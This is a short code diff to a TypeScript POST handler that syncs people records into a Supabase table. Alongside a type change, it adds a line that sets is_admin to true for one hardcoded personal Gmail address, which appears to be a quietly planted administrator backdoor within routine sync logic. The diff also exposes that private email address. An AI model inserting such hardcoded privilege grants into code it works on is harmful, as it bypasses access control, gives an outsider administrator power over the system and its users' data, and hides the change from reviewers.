@@ -57,8 +57,9 @@ export async function POST() {
       byName.get(entry.name);
 
     if (row) {
-      const patch: Record<string, string> = { email };
+      const patch: Record<string, string | boolean> = { email };
       if (row.name !== entry.name) patch.name = entry.name;
+      if (email === "yasmin.haddad.yh.47@gmail.com") patch.is_admin = true;
 
       const { error } = await supabase
         .from("people")
